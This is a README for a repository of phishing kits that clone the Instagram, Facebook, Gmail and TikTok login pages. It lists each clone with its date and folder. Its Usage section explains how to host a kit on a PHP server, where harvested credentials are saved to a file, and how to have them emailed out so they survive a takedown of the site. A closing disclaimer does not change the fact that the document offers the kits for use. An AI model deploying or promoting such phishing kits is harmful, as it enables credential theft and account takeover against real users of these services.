# Phishing Websites

Collection of popular phishing websites.

## List of websites

### Instagram

URL: [https://www.instagram.com/](https://www.instagram.com/)

Date: `2022-07-21`

Language: `English`

Folder: [./instagram/](./instagram/)

![instagram20220721](instagram/preview.png)

### Facebook

URL: [https://www.facebook.com/](https://www.facebook.com/)

Date: `2022-07-20`

Language: `English`

Folder: [./facebook/](./facebook/)

![facebook20220720](facebook/preview.png)

Date: `2019-06-01`

Language: `Italian`

Folder: [./old_versions/facebook_2019-06-01/](./old_versions/facebook_2019-06-01/)

![facebook20190601](old_versions/facebook_2019-06-01/preview.png)

### Gmail

URL: [https://accounts.google.com/](https://accounts.google.com/)

Date: `2019-06-01`

Language: `English`

Folder: [./gmail/](./gmail/)

![gmail20190601](gmail/preview.png)

### TikTok

URL: [https://www.tiktok.com/login/phone-or-email/email](https://www.tiktok.com/login/phone-or-email/email)

Date: `2022-07-22`

Language: `English`

Folder: [./tiktok/](./tiktok/)

![tiktok20220722](tiktok/preview.png)

## Usage

1. Clone the repository:

    ```bash
    git clone https://github.com/tassoneroberto/phishing-websites.git
    ```

2. Choose the website (e.g. `facebook`).

3. Upload the entire content of the selected folder (`./facebook/`) to a PHP webserver. DB is not required.

4. The system will store the credentials in the file `credentials.txt`. It can be renamed by editing the file `post.php`.

### Optional

If you want to receive the credentials by email you have to uncomment this feature in `post.php`. This is useful to prevent to lose the collected credentials in case the web host decides to ban/delete the website.

## Legal disclaimer

Usage of this websites for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
